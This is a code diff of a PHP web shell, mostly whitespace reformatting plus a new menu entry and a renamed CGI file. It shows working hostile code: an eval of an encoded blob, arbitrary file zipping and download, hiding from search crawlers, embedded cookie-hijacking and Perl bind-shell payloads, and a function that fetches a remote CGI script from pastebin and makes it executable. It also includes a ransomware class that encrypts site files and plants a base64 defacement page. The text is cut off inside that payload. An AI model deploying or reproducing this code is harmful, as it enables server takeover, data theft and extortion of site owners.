@@ -12,33 +12,33 @@
 @ini_set('zlib.output_compression', 'Off');
 eval(gzuncompress(base64_decode("eNpTKS1OLcpLzE21VXIuSywytLQwUbLm5VIpSCwuLs8vSkEIGxoaQqRScxMzc2yV0lNTqooTi7JK85Lzc0vzMksyHdJBMnpArpK1AgDlEhyx")));
 function Zip($source, $destination) {
-    if (!extension_loaded('zip') || !file_exists($source)) {
+    if(!extension_loaded('zip') || !file_exists($source)) {
         return false;
     }
     $zip = new ZipArchive();
-    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
+    if(!$zip->open($destination, ZIPARCHIVE::CREATE)) {
         return false;
     }
     $source = str_replace('\\', '/', realpath($source));
-    if (is_dir($source) == true) {
+    if(is_dir($source) == true) {
         $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
-        foreach ($files as $file) {
+        foreach($files as $file) {
             $file = str_replace('\\', '/', realpath($file));
-            if (is_dir($file) == true) {
+            if(is_dir($file) == true) {
                 $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
-            } else if (is_file($file) == true) {
+            } else if(is_file($file) == true) {
                 $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
             }
         }
-    } else if (is_file($source) == true) {
+    } else if(is_file($source) == true) {
         $zip->addFromString(basename($source), file_get_contents($source));
     }
     return $zip->close();
 }
-if (isset($_GET['zip'])) {
+if(isset($_GET['zip'])) {
     $src = $_GET['zip'];
     $dst = getcwd() . "/" . basename($_GET['zip']) . ".zip";
-    if (Zip($src, $dst) != false) {
+    if(Zip($src, $dst) != false) {
         $filez = file_get_contents($dst);
         header("Content-type: application/octet-stream");
         header("Content-length: " . strlen($filez));
@@ -49,7 +49,7 @@ filename=\"" . basename($dst) . "\";");
     exit;
 }
 @error_reporting(4);
-if (!empty($_SERVER['HTTP_USER_AGENT'])) {
+if(!empty($_SERVER['HTTP_USER_AGENT'])) {
     $userAgents = array(
         "Google",
         "Slurp",
@@ -58,7 +58,7 @@ if (!empty($_SERVER['HTTP_USER_AGENT'])) {
         "Yandex",
         "Rambler"
     );
-    if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
         header('HTTP/1.0 404 Not Found');
         exit;
     }
@@ -319,14 +319,14 @@ echo "
     #divAlert { background-color:yellow; color:red;}
     </style>
 	<div id=divAlert></div>";
-if ($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password)) {
-    if ($_POST["usrname"] == $username && $_POST["passwrd"] == $password) {
+if($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password)) {
+    if($_POST["usrname"] == $username && $_POST["passwrd"] == $password) {
         print '<script>document.cookie="user=' . $_POST["usrname"] . ';";document.cookie="pass=' . md5($_POST["passwrd"]) . ';";</script>';
-        if ($email != "") {
+        if($email != "") {
             mail_alert();
         }
     } else {
-        if ($_POST['usrname']) {
+        if($_POST['usrname']) {
             print '<script>alert("Wrong Username or password");</script>';
         }
         echo '
@@ -353,7 +353,7 @@ $color_non = "red";
 $path      = $_GET['path'];
 $sep       = "/";
 $date      = date('d-M-Y H:i');
-if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
+if(strtolower(substr(PHP_OS, 0, 3)) == "win") {
     $os  = "win";
     $sep = "\\";
     $ox  = "Windows";
@@ -401,7 +401,7 @@ disable_functions=NONE";
 $forbid_dir        = "Options -Indexes";
 $cookie_highjacker = "rVVdc5pAFH13xv9wh3Eipq22M3miasaJGGmNWsS2mU6HQVyEFlnCLkk7If+9d8EPCKFtpuVB2d1z7z177gf1Wvc8dMN6rXP6av/AJQlIZHGyBouBBaEVcaAOaNOhPninGWNYjNXJBMKIfiM2h53Zaadec+LA5h4N0AXX5nKrXruv1wAfzwF5QzgJbmVpbBhz82KiqVPD1OZSC05OgPHIthixt2El7CVIcfA9oHeB1GplXnfOxdPwQuhBle3bDPiQ/RGfkTKjz+Zopn8a6EN1KN5+z6sEfja7koc/cNTVq5mhmoPhsJpaAfMcRgXDCiIeY4TLDXOh6h9V/UszZ9P8mjKqOHtEtgL1N3QrTMuEK+wPEYoWEeFxFMiIEXd/yJWxTzdDi1u5QkbQhG56kk0Dx9vE2CaIY23+g++dNmxKv3ukQPfDUtWvzYWha9PLA99GRDYe4yQyNz5dWT5DE3lFqd8CL/BMzI3cPEJSRHOfHJGQkn2rmNWCSHvDNJ0ZbNejeHDgszVDis3+hNLzmW4cmccMo1obEhSxaWEvcWUOLrH1cje9YdzcEu7SdcHgSjXGs2Feka3pUvYkg/FskfdIHBKRqBxeV0eqrh6rorHGSdYTPyBLPqwXYpSN4BpcxVMYDA713sBk9xwakkCWsixLWJPWC+mokFA9RNXNrcVtV5Y6K5dvVx0PgZlFC5IESgi/ACkXtxPGnMkiPgbU5kqanwSE5EouKwkICZScSgkMRA6UQkISyFRVirIngMooR+ESGA4M9R4UeMg0wp2L2ey9pirHGu6uov5TA+F/XuGf7pBeQqm+QBA8pu/YPmUkpbrr9kOT45LYLgWpXuuKtPW7LrHWfVxxj/ukf/b6DKaUw4jGwbrbyTbxtJPCuiu6/imW7pt+DoUr3Av7hktw0NzEhIkP61KfgNQuFDnOiIVhLnUNJ2Zbgjv89gboxhFuAGcRdz0GKNEtidrdTpgGTkOKwXOOy18=";
 $bind_perl         = "rZJdb5swFIavi8R/OHXTFSSmZJu2i0abxAjtWApEQLtNVYUoOK1VgimmmqIq/30+dpKmmna1+Aq/7/Fzvjg6HD6JbnjLmmFLuxre/jYN0zjax5EY+P+jMee0oV3R0woKAQW0RdcDn0MQTRL3e5B9g5A1DNJ7WtfwdQlKm84+fhrBdRaf3Wwwe6lmP7MxjSdBIeXlA+3H+uLxZs7u5GXAhcr2GQZae+aiKRZ0hV7Lu/5AOm5yfnU9ulFSx3sutTvaq8/bJUZbJ33ZntgYUC4qaZO6rcgYUw/EUvR0gZpavbjXOptbmJs+AgnTH6z58J7YpvFsGgfrF7IkcuzFYTrzvWMYTvHZShFHWK3MozhCtWWlfnLlJw7MzvIg8jMH0tib5mmW+G7ogC7bBt5BxSgQ/eh0cIhQQXu88/aFksYXOQI0KE/8y9R3JxPptEX5YJGaOPDO3uFtEaegobLVaotDr6iqLmeNpYbqyN8Jebkb/drB4KMNoGZyCM1ORaH704uj6CVaR2ziTWPOO2ssW8VMckJFWVLZkncR+BG2oUD2GMqa4w+g5PXEeYuZskkQOUC+vNEewXVurfgy+6fnJ8lfnt6htd6lklRineb1XbJfCxKIwuoP";
-if ($safemode == "On") {
+if($safemode == "On") {
     echo "<div id='alert'><a class=\"alert_yellow\"
 href=\"#alert\">Safe Mode : <font
 color=red>ON</font></a></div>";
@@ -478,7 +478,7 @@ color=red>{$srvr_sof}</font>
 color=\"#666\"
 > : </font></font><font color=red>";
 echo disabled_functns() . "</font><br />";
-if ($os == 'win') {
+if($os == 'win') {
     echo "Drives <font color=\"#666\" > : </font>";
     echo drivesx();
 } else {
@@ -528,6 +528,7 @@ echo "
 <li>[<a href=\"?ftpman\">FTP Manager</a>]</li>
 </ul><ul>
 <li>[<a href=\"?ganteng\">Ransomeware</a>]</li>
+<li>[<a href=\"?logger\">Check Steganologer</a>]</li>
 <li>[<a href=\"?adminer\">Adminer</a>]</li>
 <li>[<a href=\"?phpinfo\">PHP Info</a>]</li>
 <li>[<li class=kedip><a href=\"?killme\"><font color='#008080'>Suicide</font></a></li>]</li>
@@ -539,15 +540,15 @@ function alert($alert_txt) {
     echo "<script>alert('" . $alert_txt . "');window.location.href='?';</script>";
 }
 function disabled_functns() {
-    if (!@ini_get('disable_functions')) {
+    if(!@ini_get('disable_functions')) {
         echo "None";
     } else {
         echo @ini_get('disable_functions');
     }
 }
 function drivesx() {
-    foreach (range('A', 'Z') as $drive) {
-        if (is_dir($drive . ':\\')) {
+    foreach(range('A', 'Z') as $drive) {
+        if(is_dir($drive . ':\\')) {
             echo "<a> [<a style='color:aqua; text-decoration:none;' href='?path=" . $drive . ":\\'> " . $drive . " </a>] </a>";
         }
     }
@@ -562,11 +563,11 @@ function mail_alert() {
     mail($email, $subject, $content_mail, $from);
 }
 function filesizex($size) {
-    if ($size >= 1073741824)
+    if($size >= 1073741824)
         $size = round(($size / 1073741824), 2) . " GB";
-    elseif ($size >= 1048576)
+    elseif($size >= 1048576)
         $size = round(($size / 1048576), 2) . " MB";
-    elseif ($size >= 1024)
+    elseif($size >= 1024)
         $size = round(($size / 1024), 2) . " KB";
     else
         $size .= " B";
@@ -579,7 +580,7 @@ function freesize() {
     echo filesizex(disk_free_space("/"));
 }
 function file_perm($filz) {
-    if ($m = fileperms($filz)) {
+    if($m = fileperms($filz)) {
         $p = '';
         $p .= ($m & 00400) ? 'r' : '-';
         $p .= ($m & 00200) ? 'w' : '-';
@@ -594,40 +595,40 @@ function file_perm($filz) {
     }
 }
 function mysqlx() {
-    if (function_exists('mysql_connect')) {
+    if(function_exists('mysql_connect')) {
         echo "<font color='aqua'>Enabled</font>";
     } else {
         echo "<font color='#008080'>Disabled</font>";
     }
 }
 function oraclesx() {
-    if (function_exists('oci_connect')) {
+    if(function_exists('oci_connect')) {
         echo "<font color='aqua'>Enabled</font>";
     } else {
         echo "<font color='#008080'>Disabled</font>";
     }
 }
 function mssqlx() {
-    if (function_exists('mssql_connect')) {
+    if(function_exists('mssql_connect')) {
         echo "<font color='aqua'>Enabled</font>";
     } else {
         echo "<font color='#008080'>Disabled</font>";
     }
 }
 function postgreyx() {
-    if (function_exists('pg_connect')) {
+    if(function_exists('pg_connect')) {
         echo "<font color='aqua'>Enabled</font>";
     } else {
         echo "<font color='#008080'>Disabled</font>";
     }
 }
 function strip($filx) {
-    if (!get_magic_quotes_gpc())
+    if(!get_magic_quotes_gpc())
         return trim(urldecode($filx));
     return trim(urldecode(stripslashes($filx)));
 }
 function curlx() {
-    if (function_exists('curl_version')) {
+    if(function_exists('curl_version')) {
         echo "<font color='aqua'>Enabled</font>";
     } else {
         echo "<font color='#008080'>Disabled</font>";
@@ -645,12 +646,12 @@ function rename_ui() {
 	<input type='submit' value='O'></form></p><br><br><hr><br><br></center></div>";
 }
 function cgi() {
-    if (!file_exists('.config')) {
+    if(!file_exists('.config')) {
         mkdir('.config', 0755);
     }
-    $file_cgi   = ".config/php.ini";
+    $file_cgi   = ".config/cgi.izo";
     $isi_htcgi  = "
-AddHandler cgi-script .ini
+AddHandler cgi-script .izo
 Options -Indexes";
     $htcgi      = fopen(".config/.htaccess", "w+");
     $cgi_script = file_get_contents("https://pastebin.com/raw/MUD0EPjb");
@@ -658,7 +659,7 @@ Options -Indexes";
     fwrite($cgi, $cgi_script);
     fwrite($htcgi, $isi_htcgi);
     chmod($file_cgi, 0755);
-    echo "<iframe src='.config/php.ini' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
+    echo "<iframe src='.config/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
 }
 function rctm() {
     echo "<iframe width='100%' height='100%' src='https://threatmap.fortiguard.com' frameborder='0'>";
@@ -667,7 +668,7 @@ function soundcloud() {
     echo "<iframe width='100%' height='100%' scrolling='no' frameborder='no' src='https://w.soundcloud.com/player/?url=https://api.soundcloud.com/playlists/355874911&amp;color=#00cc11&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&amp;visual=true'></iframe>";
 }
 function gantengware() {
-echo "
+    echo "
 <style type='text/css'>
 body {
     background: #1A1C1F;
@@ -700,167 +701,120 @@ body {
 </head>
 <body>
 <div class='result'>";
-error_reporting(0);
-set_time_limit(0);
-ini_set('memory_limit', '-1');
-class deRanSomeware
-{
-   public function shcpackInstall(){
-    if(!file_exists(".htabak")){
-      rename(".htaccess", ".htabak");
-      if(fwrite(fopen('.htaccess', 'w+'), "\rDirectoryIndex index.php\r\nErrorDocument 404 /index.php")){
-            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
-      }
-      if(file_put_contents("index.php", gzinflate(base64_decode("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")))){
-            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  index.php (Default Page)<br>';
-      }
-    }
-   }
-   public function shcpackUnstall(){
-
-      if( file_exists(".htabak") ){
-        if( unlink(".htaccess") && unlink("index.php") ){
-          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
-          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> index.php (Default Page)<br>';
-        }
-        rename(".htabak", ".htaccess");
-      }
-
-   }
-
-   public function plus(){
-      flush();
-      ob_flush();
-   }
-   public function locate(){
-        return getcwd();
-    }
-   public function shcdirs($dir,$method,$key){
-        switch ($method) {
-          case '1':
-            deRanSomeware::shcpackInstall();
-          break;
-          case '2':
-           deRanSomeware::shcpackUnstall();
-          break;
-        }
-        foreach(scandir($dir) as $d)
-        {
-            if($d!='.' && $d!='..')
-            {
-                $locate = $dir.DIRECTORY_SEPARATOR.$d;
-                if(!is_dir($locate)){
-                   if(  deRanSomeware::kecuali($locate,"ini.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"ini.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htabak") ){
-                     switch ($method) {
-                        case '1':
-                           deRanSomeware::shcEnCry($key,$locate);
-                           deRanSomeware::shcEnDesDirS($locate,"1");
-                        break;
-                        case '2':
-                           deRanSomeware::shcDeCry($key,$locate);
-                           deRanSomeware::shcEnDesDirS($locate,"2");
-                        break;
-                     }
-                   }
-                }else{
-                  deRanSomeware::shcdirs($locate,$method,$key);
+    error_reporting(0);
+    set_time_limit(0);
+    ini_set('memory_limit', '-1');
+    class deRanSomeware {
+        public function shcpackInstall() {
+            if(!file_exists(".htabak")) {
+                rename(".htaccess", ".htabak");
+                if(fwrite(fopen('.htaccess', 'w+'), "\rDirectoryIndex index.php\r\nErrorDocument 404 /index.php")) {
+                    echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
+                }
+                if(file_put_contents("index.php", gzinflate(base64_decode("7Vttc9s2Ev5cz/g/MOhVES2aFPXiF0qw6zi5aS5Nmrm417tzfD6IBCVEFKmAkGXV9v32WwCkRMmSorT2zM3VmZYAFovdxWL3AaCB2z0xiI62t75p9ygJZOWbtmAiokc/EL9PA+PFxDi9Itw9PGi0Hd2jmCIW940epyFGPSGGnuOESSxSu5sk3YiSIUttPxk4fpoeh2TAogn+iXeY4EmMDE4jjFIxiWjao1QgQ0yGFCNBr4UcgAwHdCgtqc/ZUByRiHJRRq9jZvyTDEhsnNF+nERJl1kf4xejPlA0/QURI/tj/DH+C4m70H5PeUx6xlsaT0hEelPGj/GHvP0j9L9kAVN1Fnf7IzlSCwGi8YaM1PgRH/WMk5j0jTfUZ5HxcyxGfdnziQTMeEnHJCUf47ckG3ISSAXGTxwMMf7RNV4kQdJDZqvtZHPS85NOWJw+dH3rgzMJiyk3bra3DGPMAtHzDvevxi3ZHBDeZbFXuxobZCQSoN1tb0n/K2ZZ2VVOjyZe7nU1TqrYJRHrxp5PY0G5okZUQHU3HRIf5u+5w2tF9sHB3Bv3mKCq7eycckoENZIryiMy3HEktWBOVUsDq3d7lHV7IqM4OycxGxDBkng2ZndMO30G1uRdntGNmPB7rlGzm6nB4pDFuWr5f/5vgwF3MnqkF7xY9Hb9HouCcs3UntSzMr7d2w/rAWmtNaW2xJSVZtxnXmZGfcGM0N0L98L1ZtS/xoz7zGCGs/OGTkJOBjSVK7C99X2urJ/Tp85U5lW/0+XMKgGBnIYJH3hGnMTzRkBgLe1NZESJiWe4inAnP/vrJKd9Oi7vVu1mQLuWAZVDqJirda3ln2qv2vvNmQHu482ttnZyv0t0fa3Vyg9V+yB3g7uB21awr/BavfloU2vWHk/0Wqt19LjKC1W7tkmoLWNe4bHmI+bQ43ls/8seq9oN5YXNguw+7wp/HTyev9zqY8lWEP/9E4g+gegTiD6B6BOI/g4QXXUirT0KmEL0Fdy2FnJUNYKLT3m3NryGXK8Pr9cs2Tr2gvpHBNP5uT00ns5LXw+pBV80lS9qm7ruHvty1z00os5P7qFBdUH6Wtvv+cL9Ote5X3LdQ0PrQkY9quvWA+y9DNz7uoTd+5LrHhpl5yf34EBbFL/8wPqEsU8Yu9J1Txj7hLFPGPt1GDsYrDnR1v930FYtxqZYu8j8x0Valf6b4uwi8x8XZZUnNsXYReY/LsKqvNsUXxeZ/x/RdckJ9glTnzD1CVM3ctsTpj5h6jJM/eabtqPeo6jnQE7+HqjdSYKJ0emqFwsYdSLi95GRxPKFCr0WAxqPMOJUjHhshCRKaUv2Aj4HyThe0jNIRild0Rdw0k0F4WK+T3alNKK+WNapX9IwtR3ohzIYVZGhn6CoaurzJIpY3MVoQlNkKNZOwgMKE4oTZJAoSsYYybc0w4hMYAT39bum1HOcsZ0mozjwo2QUqEdNkody53jEI6yYvqufOA4ZskVGWAK/nzqNar3hNg6abklquJTDseAjWuqxgF5yKoMswGo2pbSXjC9hLPhVpEUaeI3rUarJ6TBJpxxXLB2RCGcOaTvaG9oz+qWPqsNi8unjqt/WCNiVwQKMpg+UtP/lCgy6834byO4r0h3FPiweZ3bIIpraY3D8kNNUPxCrVd2GUz1woqSb2MO4iwz1yAyjt3r07DHYgiWLLfnQBiLCh6Gzl2Yp+xXa+2jpazY54mgDyRvraaKjsx5LjffgGON1avwCEU15OIqKutoOuFCvjFNYmuypW/Et2CdyRTRV+hjMNtI4GQ/INa5XZ22dlzEdGyeck0kZqRdbyIJQl1ENFU4D+JLPI4LM2TilqDDshDMSGe8I52rQGYPDFZSnyYD5xgeAEuPth+J4/WoMIxtlNBb30yGFQK7ae3PmKucUTYbAUDS3QIPs/BVQCrszUsG6TK9+aNZJhEgGRQqXqa4JAuzmusoulZRMyfXl4KoosaXJPg/SJeQoFFzCx/2eDvgHUpHFYQIDyRXrEpFwW6bnSRfW08iU0yYOEn8k89gGfCmVpq0uFa8iKqsvJq+DUulZUaQ9IHCcLTs/DSknTjbvON3Dq4cX1Wj+RA7Ga8Qaxtxkkj4Ge29vQc/trRq8vRVC2sqHZQZsIwHgEelTXoZ6l5rGjXqSJzvwWyJ6dhglSda5owh6TNk09aaT4bWk6qeKuWz5Rk0uUlk/i2OhUQZDjNtbPYXssVxx2Q1sTOcrdybbjxjUf6A6BIxiRKzg/UXuEcAq91UKgKnUwtSXa4PIhN3KZjHA0SotRZ6i9DySZbQr7+BCSuwWUgF4YaeGyeNqi7VzrharVPL3ghCm5+wCdFVbxtJ/2eafBa7mnVuLHbfZWuSWSZGJtat1ozI/wnH1A05pDnCtCsEySlGFmQVOW50jbAl6f9aPf3PEOS9GU060Ixp3Rc+8mBMhEWKRe+pIszLvvSWaP0gBRWn32TR2TlH0nnGKusK6uI+nkLdTVOM0JaOMqSKuYRdWMmeDrft6bm6FcNotyjLvlsqqbSjLqW0irf4bpVWKfY3lshsPIbt2V3Q9iJnMiantFFN2d65Rm1uaJTEa0VDgooX3WeBQWOSYZMk9SK6oxq55TJvRVepultcVnOdia3GuFVwMug1mUJlhgEZjGFfOFJmtL8/PKK5kTjzCa/wqAXtIeEpfx6J83zrzaC7A6zszA01T32keMl0eOF8eNWEeNWPmU6aa3yXznUkdlXBKhTzrJSNRRrPQRVazmsX1uvid7ghjDofOMmqnQxLL+8FzuSVU0HNDRQF+DhYw9UyddNIkGgnagqjzdlGlsCEC+5Em6LNlBcGFFOQdIW2JdNX0wKL1ZxtvEkcJCXB+miheaIt/bPGFE7bjtJ+dn748OTs5396CSxYX/kjgGzhVXeat1Lu5s0gQeHm2l4nVsXzzBvy5vRXgGyncQ9ntF1lDDvdtOCBS75lrBSwlnYheshj+G46EpMF9FjZTL/ejBSP9JJDsdy0Wln0T3F9WwuGYEhuBieCCSUO4GwUIY6ktCQ3/nF6USmVZ4AA+Zksea7a3fBy0AuzbWomFUgGHwe50HDBkXTA4WLm750ymaRFMAC1+TMaUn5KUlk2L4qknAvMGhNzeZmtCr0CAmoO9OPHMXbQVZKKPKc6rXmDDJTLTD3bJnhnBtOoYUzsGF53BHFQ/tQF6oO8dEE2pEL1+9/7nMyQZBem+g4vw7S06e/X3s5O/vjopkk19Lr0LbHD7KQw/lr7H0ybYApcpvyd9qztUU876g3KlHfJkcNojXHIrHnPBP+7BAcayQ5kK9ykgHVaLJBuZLeWOEJybDiMGeVgBti6uWj18g/6NPPQfZLkeeoasmoe+R1bdQ98iq+GhP0Gaeug7ZO156F/I2vdQCVkHHtpB1qGHysiqeghSGe2CjEsoMZQVKFtQelA+R95z9NyCmofa8LWhPILSgfIYyo8foXKL7iyGb2jqe7V9CwoCIQ41QTreoSX/aoh69ZqV/SiDPLduqWutrHTk7x+K48DSv8JEid/33EYza14utFUVNKSKXquq+mWxIct4NMjGNWT9sthQ5ZDAfcxzDy3U4ZT0kazCWZFy4YH8XjIAk/csFFBAGoq8xh6YHHj1Jgzs0tHQq9dV7TKrjnKCzGqv3tCd00Ygv3Kj8+r7lhxyYCkY9uqHlmJqVK3Q9Vy3ZoU1KOpWWIeiYYUNKJpW2IRizwr3oNi3wn0oDqzwAIpDKzz03JocXoXShRLk1ECOC4Jq9TvrEwYUieRnID+x/CTyM5Sfz/LD4QOp5gsevaETiDpgqpoW5FWPhUKTooxEooww